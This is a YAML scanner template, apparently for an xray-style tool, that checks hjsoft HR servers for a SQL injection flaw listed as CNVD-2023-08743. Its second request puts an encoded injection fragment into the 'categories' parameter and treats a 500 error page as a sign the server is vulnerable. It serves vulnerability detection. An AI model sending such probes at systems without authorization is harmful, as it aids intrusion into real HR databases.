name: yaml-poc-hjsoft-hj_hr-sql_injection-CNVD-2023-08743
binding: d4d1d815-24b5-4c08-b498-3e08ba7d143b
detail:
    author: luhan.xu
    links:
        - https://www.cnvd.org.cn/flaw/show/CNVD-2023-08743
    vulnerability:
        id: d9dbe920-46b9-47eb-91b2-a10892a250ea
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("TreeNode") && response.body_string.contains('title="root')
    r1:
        request:
            cache: true
            method: GET
            path: /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~
            follow_redirects: false
        expression: response.status == 500 && response.body_string.contains("<title>ERROR") && response.body_string.contains("mainbackground")
expression: r0() && r1()
